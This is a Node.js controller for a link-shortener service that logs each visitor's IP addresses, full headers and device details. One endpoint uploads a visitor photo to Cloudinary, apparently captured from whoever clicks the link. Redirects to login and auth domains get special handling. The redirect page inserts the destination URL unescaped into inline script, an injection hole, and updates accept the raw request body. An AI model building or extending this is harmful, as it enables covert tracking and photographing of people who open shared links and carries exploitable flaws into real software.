const { generateShortCode } = require("../utils/linkUtils");
const UAParser = require("ua-parser-js");
const Visit = require("../models/Visit");
const Link = require("../models/Link");
const geoip = require("geoip-lite");
const cloudinary = require("cloudinary").v2;

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

exports.redirectLink = async (req, res) => {
  try {
    const { shortCode } = req.params;

    // Find the link
    const link = await Link.findOne({ shortCode }).lean();
    if (!link) {
      return res.status(404).send(`
        <html>
          <body>
            <h1>Link not found</h1>
            <p>The requested link does not exist or has been removed.</p>
          </body>
        </html>
      `);
    }

    // Ensure absolute URL (must include http/https)
    let dest = (link.originalUrl || "").trim();
    if (!/^(https?:)?\/\//i.test(dest)) {
      dest = `https://${dest.replace(/^\/+/, "")}`;
    }

    // --- Collect tracking info safely (may be undefined) ---
    const t = req.trackingData || {};
    const ipInfo = t.ipInfo || {};
    const device = t.device || {};
    const headers = t.headers || req.headers || {};
    const referrer = t.referrer || req.get("referer");

    console.log("Tracking data:", {
      publicIp: ipInfo.publicIp,
      userAgent: headers["user-agent"],
      device: device.type,
      referrer: referrer,
    });

    // --- Save analytics & increment click count ---
    const visitData = {
      link: link._id,
      publicIp: ipInfo.publicIp,
      internalIp: ipInfo.internalIp,
      userAgent: headers["user-agent"],
      sessionId: t.sessionId,
      device: {
        type: device.type,
        os: device.os,
        browser: device.browser,
        model: device.model,
        isMobile: device.isMobile,
        isBot: device.isBot,
      },
      referrer: referrer,
      headers: headers,
    };

    // Save tracking data (don't await to make redirect faster)
    Promise.allSettled([
      Visit.create(visitData),
      Link.updateOne({ _id: link._id }, { $inc: { clicks: 1 } }),
    ])
      .then((results) => {
        console.log("Tracking results:", results);
        console.log(
          "Successfully saved visit data and incremented click count."
        );
      })
      .catch((err) => {
        console.error("Error saving tracking data:", err);
      });

    // For sensitive domains, use meta refresh instead of HTTP redirect
    if (
      dest.includes("google.com") ||
      dest.includes("gmail.com") ||
      dest.includes("microsoft.com") ||
      dest.includes("facebook.com") ||
      dest.includes("apple.com") ||
      dest.includes("login.") ||
      dest.includes("auth.") ||
      dest.includes("account.")
    ) {
      return res.send(`
        <!DOCTYPE html>
        <html>
          <head>
            <title>Redirecting...</title>
            <meta http-equiv="refresh" content="0; url=${dest}" />
            <script>
              window.location.href = "${dest}";
            </script>
          </head>
       <body style="margin:0;padding:0;background:transparent;">
          </body>
        </html>
      `);
    }

    // For regular URLs, use HTTP redirect
    res.redirect(302, dest);
  } catch (error) {
    console.error("Redirect error:", error);
    return res.status(500).send(`
      <html>
        <body>
          <h1>Internal Server Error</h1>
          <p>Something went wrong. Please try again later.</p>
        </body>
      </html>
    `);
  }
};
// Add this function to your linkController.js
// Add this to your linkController.js
exports.trackVisitOnly = async (req, res) => {
  try {
    const { shortCode } = req.params;

    // Find the link
    const link = await Link.findOne({ shortCode }).lean();
    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    // --- Collect tracking info safely (may be undefined) ---
    const t = req.trackingData || {};
    const ipInfo = t.ipInfo || {};
    const device = t.device || {};
    const headers = t.headers || req.headers || {};
    const referrer = t.referrer || req.get("referer");

    // --- Save analytics & increment click count ---
    const visitData = {
      link: link._id,
      publicIp: ipInfo.publicIp,
      internalIp: ipInfo.internalIp,
      userAgent: headers["user-agent"],
      sessionId: t.sessionId,
      device: {
        type: device.type,
        os: device.os,
        browser: device.browser,
        model: device.model,
        isMobile: device.isMobile,
        isBot: device.isBot,
      },
      referrer: referrer,
      headers: headers,
    };

    // Save tracking data
    await Promise.allSettled([
      Visit.create(visitData),
      Link.updateOne({ _id: link._id }, { $inc: { clicks: 1 } }),
    ]);

    console.log("Tracking-only: Successfully saved visit data");

    res.json({
      success: true,
      message: "Tracking completed successfully",
    });
  } catch (error) {
    console.error("Tracking error:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
};

exports.trackVisitWithPhoto = async (req, res) => {
  try {
    const { shortCode } = req.params;
    const { photo, timestamp } = req.body;

    // Find the link
    const link = await Link.findOne({ shortCode }).lean();
    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    let photoUrl = null;

    // Upload photo to Cloudinary if provided
    if (photo) {
      try {
        const uploadResult = await cloudinary.uploader.upload(photo, {
          folder: "link-analytics/photos",
          resource_type: "image",
          transformation: [
            { width: 400, height: 400, crop: "limit" },
            { quality: "auto" },
            { format: "jpg" },
          ],
        });
        photoUrl = uploadResult.secure_url;
      } catch (uploadError) {
        console.error("Cloudinary upload error:", uploadError);
        // Continue without photo if upload fails
      }
    }

    // --- Collect tracking info safely ---
    const t = req.trackingData || {};
    const ipInfo = t.ipInfo || {};
    const device = t.device || {};
    const headers = t.headers || req.headers || {};
    const referrer = t.referrer || req.get("referer");

    // --- Save analytics & increment click count ---
    const visitData = {
      link: link._id,
      publicIp: ipInfo.publicIp,
      internalIp: ipInfo.internalIp,
      userAgent: headers["user-agent"],
      sessionId: t.sessionId,
      device: {
        type: device.type,
        os: device.os,
        browser: device.browser,
        model: device.model,
        isMobile: device.isMobile,
        isBot: device.isBot,
      },
      referrer: referrer,
      headers: headers,
      photo: photoUrl, // Store Cloudinary URL
      hasPhoto: !!photoUrl, // Flag to easily check if photo exists
    };

    // Save tracking data
    await Promise.allSettled([
      Visit.create(visitData),
      Link.updateOne({ _id: link._id }, { $inc: { clicks: 1 } }),
    ]);

    console.log("Tracking with photo: Successfully saved visit data");

    res.json({
      success: true,
      message: "Tracking completed successfully",
      hasPhoto: !!photoUrl,
    });
  } catch (error) {
    console.error("Tracking with photo error:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
};

function parseUserAgent(ua) {
  // Use ua-parser-js or custom logic
  return {
    os: "Unknown",
    browser: "Unknown",
    device: "Unknown",
  };
}

exports.createLink = async (req, res) => {
  try {
    const { originalUrl, domain, shortCode, meta } = req.body;

    // Validate required fields
    if (!originalUrl) {
      return res.status(400).json({ error: "Original URL is required" });
    }

    // Validate URL format
    try {
      new URL(originalUrl);
    } catch (error) {
      return res.status(400).json({ error: "Invalid URL format" });
    }

    // Check if shortCode is provided and process it
    let finalShortCode = shortCode;

    // If no short code provided, generate one
    if (!finalShortCode || finalShortCode.trim() === "") {
      finalShortCode = generateShortCode();
    } else {
      // Process the short code - replace spaces with underscores and trim
      finalShortCode = finalShortCode.trim().replace(/\s+/g, "_");

      // Remove all character restrictions - allow any characters
      // Only check length
      if (finalShortCode.length < 1) {
        return res.status(400).json({
          error: "Short code is required",
        });
      }

      if (finalShortCode.length > 30000000) {
        return res.status(400).json({
          error: "Short code must be less than 30000000 characters",
        });
      }

      // Check if short code already exists
      const existingLink = await Link.findOne({ shortCode: finalShortCode });
      if (existingLink) {
        return res.status(400).json({ error: "Short code already exists" });
      }
    }

    const link = new Link({
      shortCode: finalShortCode,
      originalUrl,
      domain: domain || DEFAULT_PUBLIC_DOMAIN,
      createdBy: req.user._id,
      meta,
    });

    await link.save();
    res.status(201).json(link);
  } catch (error) {
    if (error.code === 11000) {
      return res.status(400).json({ error: "Short code already exists" });
    }
    res.status(400).json({ error: error.message });
  }
};

exports.getUserLinks = async (req, res) => {
  try {
    const links = await Link.find({ createdBy: req.user._id });
    res.json(links);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

exports.updateLink = async (req, res) => {
  try {
    const { id } = req.params;
    const updates = req.body;

    const link = await Link.findOneAndUpdate(
      { _id: id, createdBy: req.user._id },
      updates,
      { new: true }
    );

    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    res.json(link);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
};

exports.deleteLink = async (req, res) => {
  try {
    const { id } = req.params;

    const link = await Link.findOneAndDelete({
      _id: id,
      createdBy: req.user._id,
    });

    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    await Visit.deleteMany({ link: id });
    res.json({ message: "Link deleted successfully" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

exports.clickLink = async (req, res) => {
  const { shortCode } = req.params;
  try {
    const link = await Link.findOne({ shortCode });

    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    // Log the click details (e.g., IP, location) or increment the click count
    link.clicks += 1; // Or log the click with IP and location
    await link.save();

    res.status(200).json({ message: "Click logged successfully" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Failed to log click" });
  }
};
